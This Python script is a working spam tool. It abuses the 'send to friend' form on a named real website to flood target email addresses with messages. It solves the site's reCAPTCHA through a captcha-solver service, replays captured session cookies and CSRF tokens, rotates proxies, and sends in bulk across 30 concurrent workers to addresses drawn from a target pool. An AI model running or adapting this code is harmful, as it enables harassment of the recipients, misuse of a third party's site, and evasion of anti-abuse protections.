from os.path import basename

import requests

from module import Spam

pageurl = 'https://damnaprokat.ru/item/send-friend/1045'
key = '6Ldj21MUAAAAANSmMGQRsgLrcfq0jC9AliEVhAsG'
cookies = {
    'osclass': '6f01783ba8324c040b636cc084fb420b',
    '_ym_uid': '1675683825542789154',
    '_ym_d': '1675683825',
    '_ym_isad': '1',
}
headers = {
    'authority': 'damnaprokat.ru',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'osclass=6f01783ba8324c040b636cc084fb420b; _ym_uid=1675683825542789154; _ym_d=1675683825; _ym_isad=1',
    'origin': 'https://damnaprokat.ru',
    'referer': 'https://damnaprokat.ru/item/send-friend/1045',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        response = None
        cap = self.captcha_solver.solve(key, pageurl)
        if not cap:
            return response
        data = {
            'CSRFName': 'CSRF2098622018_1068014518',
            'CSRFToken': 'f76bc98caad934a325c3397fe0c39c133f9830b3c21baa332131a91f366fe76f1a940a1c09a8a72cc7a41959f57af8f0ae8f2b41096fb8069f42440ff48dee74',
            'action': 'send_friend_post',
            'page': 'item',
            'id': '1045',
            'yourName': self.get_text(),
            'yourEmail': target,
            'friendName': self.get_text(),
            'friendEmail': target,
            'subject': self.get_text(),
            'message': self.get_text(),
            'g-recaptcha-response': cap,
        }

        for _ in range(10):
            try:
                response = requests.post('https://damnaprokat.ru/index.php', cookies=cookies, headers=headers,
                                         data=data, proxies=self.get_proxies(), timeout=10)
                return response
            except Exception as e:
                print(e)
        return response


def main():
    spam = ConcreteSpam(basename(__file__)[:-3], target_pool_name='turk')
    res = spam.send_post()
    if res:
        spam.run_concurrently(30)


if __name__ == '__main__':
    main()
